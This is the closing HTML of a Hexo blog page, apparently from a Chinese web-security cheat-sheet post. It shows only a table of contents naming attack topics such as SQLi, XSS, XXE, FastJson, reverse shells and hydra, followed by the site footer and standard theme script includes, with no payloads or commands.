+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLi"><span class="nav-number">1.</span> <span class="nav-text">SQLi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-number">2.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DOM-XSS%E5%85%B3%E9%94%AE%E8%AF%8D%EF%BC%88Burp%EF%BC%89"><span class="nav-number">2.0.1.</span> <span class="nav-text">DOM-XSS关键词（Burp）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF"><span class="nav-number">3.</span> <span class="nav-text">CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JSONP"><span class="nav-number">3.1.</span> <span class="nav-text">JSONP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WebSocket"><span class="nav-number">4.</span> <span class="nav-text">WebSocket</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CORS"><span class="nav-number">5.</span> <span class="nav-text">CORS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CROS%EF%BC%88-Access-Control-Allow-Origin-%EF%BC%89%E7%BB%95%E8%BF%87"><span class="nav-number">6.</span> <span class="nav-text">CROS（ Access-Control-Allow-Origin: * ）绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Clickjacking"><span class="nav-number">7.</span> <span class="nav-text">Clickjacking</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="nav-number">7.1.</span> <span class="nav-text">HTTP请求走私</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSI"><span class="nav-number">7.2.</span> <span class="nav-text">SSI</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ESI"><span class="nav-number">8.</span> <span class="nav-text">ESI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LDAP%E6%B3%A8%E5%85%A5"><span class="nav-number">9.</span> <span class="nav-text">LDAP注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E6%8E%A2%E9%92%88%EF%BC%9A"><span class="nav-number">9.1.</span> <span class="nav-text">前端探针：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE"><span class="nav-number">10.</span> <span class="nav-text">XXE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FastJson-lt-1-2-48"><span class="nav-number">11.</span> <span class="nav-text">FastJson&lt;&#x3D;1.2.48</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Weblogic"><span class="nav-number">11.1.</span> <span class="nav-text">Weblogic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E5%8F%A5"><span class="nav-number">11.2.</span> <span class="nav-text">反弹shell的语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#metasploit"><span class="nav-number">11.3.</span> <span class="nav-text">metasploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E7%9C%9F%E5%AE%9E%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%EF%BC%88%E6%9D%A5%E8%87%AA%E7%BD%91%E7%BB%9C%EF%BC%89"><span class="nav-number">11.4.</span> <span class="nav-text">注册真实身份证号（来自网络）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Jackson"><span class="nav-number">12.</span> <span class="nav-text">Jackson</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Spring-Boot-Actuator"><span class="nav-number">13.</span> <span class="nav-text">Spring Boot Actuator</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Spring-SpEL%E6%B3%A8%E5%85%A5"><span class="nav-number">13.1.</span> <span class="nav-text">Spring SpEL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phpstudy%E5%90%8E%E9%97%A8"><span class="nav-number">13.2.</span> <span class="nav-text">Phpstudy后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%9B%E5%BE%AEOA%E6%B3%A8%E5%85%A5"><span class="nav-number">13.3.</span> <span class="nav-text">泛微OA注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ASPX%E5%86%99%E5%85%A5"><span class="nav-number">13.4.</span> <span class="nav-text">ASPX写入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache-Shiro%E7%A1%AE%E8%AE%A4"><span class="nav-number">14.</span> <span class="nav-text">Apache Shiro确认</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xmlrpc"><span class="nav-number">14.1.</span> <span class="nav-text">xmlrpc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-Shiro-1-4-2%E4%BB%A5%E4%B8%8B%E7%89%88%E6%9C%AC"><span class="nav-number">14.2.</span> <span class="nav-text">Apache Shiro 1.4.2以下版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap%E5%B8%B8%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-number">14.3.</span> <span class="nav-text">Nmap常用未授权访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap-%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">14.4.</span> <span class="nav-text">Nmap 弱口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JWT%E6%94%BB%E5%87%BB"><span class="nav-number">14.5.</span> <span class="nav-text">JWT攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#F5-Big%EF%BC%88443%EF%BC%8Cfofa-app-%E2%80%9DF5-BIGIP%E2%80%9D%EF%BC%89"><span class="nav-number">14.6.</span> <span class="nav-text">F5-Big（443，fofa:app&#x3D;”F5-BIGIP”）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dubbo-12345%E7%AB%AF%E5%8F%A3"><span class="nav-number">14.7.</span> <span class="nav-text">Dubbo(12345端口)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CouchDB-%EF%BC%885984%E7%AB%AF%E5%8F%A3%EF%BC%89"><span class="nav-number">14.8.</span> <span class="nav-text">CouchDB （5984端口）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E5%8F%8BNC-Cloud%EF%BC%88NC-lt-6-5-dork-Yonyou-NC-httpd%EF%BC%89"><span class="nav-number">14.9.</span> <span class="nav-text">用友NC Cloud（NC&lt;&#x3D;6.5,dork:Yonyou NC httpd）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nodepad-%E5%8E%BB%E9%87%8D%E7%9A%84%E6%AD%A3%E5%88%99%EF%BC%9A"><span class="nav-number">14.10.</span> <span class="nav-text">nodepad++去重的正则：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">14.10.1.</span> <span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hydra"><span class="nav-number">14.11.</span> <span class="nav-text">hydra</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2020-13935"><span class="nav-number">14.12.</span> <span class="nav-text">CVE-2020-13935</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">laker</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+    <br>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
